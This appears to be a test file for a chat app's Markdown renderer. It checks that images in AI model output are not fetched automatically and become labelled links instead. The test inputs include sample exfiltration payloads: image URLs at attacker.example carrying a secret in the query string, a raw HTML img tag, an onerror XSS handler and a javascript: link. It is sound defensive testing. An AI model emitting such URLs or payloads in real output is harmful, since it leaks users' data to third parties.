import test from 'node:test'
import assert from 'node:assert/strict'
import { createElement } from 'react'
import { flush, mount } from './helpers/render'

/**
 * What the renderer actually produces for an image in model output.
 *
 * The in-renderer half of the exfiltration defence. An `<img>` is fetched the
 * instant it renders, with no click, so a remote source is offered as a link
 * showing its destination host instead. The CSP is the other half and fails
 * closed if this one is missed; `csp.test.ts` covers that, and this covers the
 * behaviour rather than the shape of the source that implements it.
 *
 * These render the real component. The previous coverage matched text in
 * `Markdown.tsx`, which could only ever describe the file that exists today: it
 * could not answer what a given source produces, and it was blind to a remote
 * `<img>` reaching the DOM by a route the strings did not describe.
 */

async function render(markdown: string) {
  const { Markdown } = await import('../src/components/Markdown')
  const view = await mount(createElement(Markdown, { text: markdown }))
  await flush()
  return view
}

/** Every `src` the renderer put on an `<img>`, in document order. */
function imageSources(view: { queryAll: (s: string) => Element[] }): string[] {
  return view.queryAll('img').map((el) => el.getAttribute('src') ?? '')
}

// ── A remote source is never fetched ────────────────────────────────────────

test('A REMOTE IMAGE IS A LINK, NOT AN IMG', async () => {
  const view = await render('![shot](https://attacker.example/x.png)')
  try {
    assert.deepEqual(imageSources(view), [], 'a remote source reached an <img> and would be fetched')
    const link = view.query('a.md-remote-img')
    assert.ok(link, 'expected a labelled link')
    assert.equal(link?.getAttribute('href'), 'https://attacker.example/x.png')
  } finally {
    view.unmount()
  }
})

test('the link shows the host it would open', async () => {
  // Seeing the destination is the whole protection once loading is a decision.
  const view = await render('![shot](https://attacker.example/path/x.png)')
  try {
    assert.equal(view.query('.md-remote-img-host')?.textContent, 'attacker.example')
  } finally {
    view.unmount()
  }
})

test('plain http is treated the same as https', async () => {
  const view = await render('![shot](http://attacker.example/x.png)')
  try {
    assert.deepEqual(imageSources(view), [])
    assert.ok(view.query('a.md-remote-img'))
  } finally {
    view.unmount()
  }
})

test('A QUERY STRING CARRYING DATA DOES NOT LEAVE, which is the shape that matters', async () => {
  // The exfiltration case stated concretely: model output naming a URL whose
  // query is something it just read.
  const view = await render('![](https://attacker.example/?d=SECRETVALUE)')
  try {
    assert.deepEqual(imageSources(view), [])
    assert.equal(view.container.querySelectorAll('img').length, 0)
  } finally {
    view.unmount()
  }
})

test('BOTH SPELLINGS THAT OMIT THE SLASHES ARE STILL TREATED AS REMOTE', async () => {
  // A scheme with no slashes, and protocol-relative, which is also a UNC path
  // on Windows. Both reach the same origin once a URL parser sees them, and
  // both are missed by a `://` prefix test.
  //
  // Asserting they become a labelled LINK, not merely that they miss an <img>.
  // "Not an <img>" is also true when they fall through to the local-image
  // component, so the weaker assertion passed with the remote test weakened and
  // proved only that some other branch caught them.
  for (const src of ['https:attacker.example/x.png', '//attacker.example/x.png']) {
    const view = await render(`![shot](${src})`)
    try {
      assert.deepEqual(imageSources(view), [], `${src} reached an <img>`)
      assert.ok(
        view.query('a.md-remote-img'),
        `${src} was not recognised as remote, so its destination was never shown`
      )
      assert.equal(view.query('.md-remote-img-host')?.textContent, 'attacker.example')
    } finally {
      view.unmount()
    }
  }
})

// ── The paths that must keep working ────────────────────────────────────────

test('A DATA URL WRITTEN IN MARKDOWN IS DROPPED BEFORE IT REACHES AN IMG', async () => {
  // Measured rather than assumed, and not what the component's own comment
  // predicts. react-markdown's URL sanitiser runs first and does not pass
  // `data:`, so the src the component receives is empty and it renders nothing.
  //
  // Generated images do still appear: they arrive as a PATH in markdown and are
  // read through the local-image component, which is the case below. This test
  // exists so that a change to the sanitiser, or to the plugins, is visible here
  // rather than being discovered as either a broken image or a new one.
  const png =
    'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
  const view = await render(`![generated](${png})`)
  try {
    assert.deepEqual(imageSources(view), [])
    assert.equal(view.query('a.md-remote-img'), null, 'a data URL was labelled as remote')
  } finally {
    view.unmount()
  }
})

test('a path goes to the local-image component, and never to a remote link', async () => {
  // This is how a generated image actually reaches the screen. The component
  // then asks the main process for the bytes; with no bridge in the harness it
  // renders its own error state, which is enough to show the routing.
  const view = await render('![local](./diagram.png)')
  try {
    assert.ok(view.query('.local-image'), 'a path should route to the local-image component')
    assert.equal(view.query('a.md-remote-img'), null)
    assert.deepEqual(imageSources(view), [], 'nothing should be requested from a server')
  } finally {
    view.unmount()
  }
})

// ── Raw HTML in model output stays inert ────────────────────────────────────

test('AN IMG WRITTEN AS HTML IN MODEL OUTPUT IS NOT AN IMG', async () => {
  // The other way a fetch could be requested. react-markdown rewrites raw HTML
  // to text; this asserts the result rather than the absence of a plugin.
  const view = await render('<img src="https://attacker.example/?d=SECRETVALUE">')
  try {
    assert.equal(view.container.querySelectorAll('img').length, 0)
    assert.ok(view.text().includes('attacker.example'), 'expected it to survive as visible text')
  } finally {
    view.unmount()
  }
})

test('an onerror handler in model output does not become an attribute', async () => {
  const view = await render('<img src=x onerror="alert(1)">')
  try {
    assert.equal(view.container.querySelectorAll('img').length, 0)
    assert.equal(view.container.querySelectorAll('[onerror]').length, 0)
  } finally {
    view.unmount()
  }
})

test('a javascript: link in model output does not survive as an href', async () => {
  const view = await render('[click](javascript:alert(1))')
  try {
    const hrefs = view.queryAll('a').map((el) => el.getAttribute('href') ?? '')
    assert.deepEqual(
      hrefs.filter((h) => h.toLowerCase().startsWith('javascript:')),
      []
    )
  } finally {
    view.unmount()
  }
})
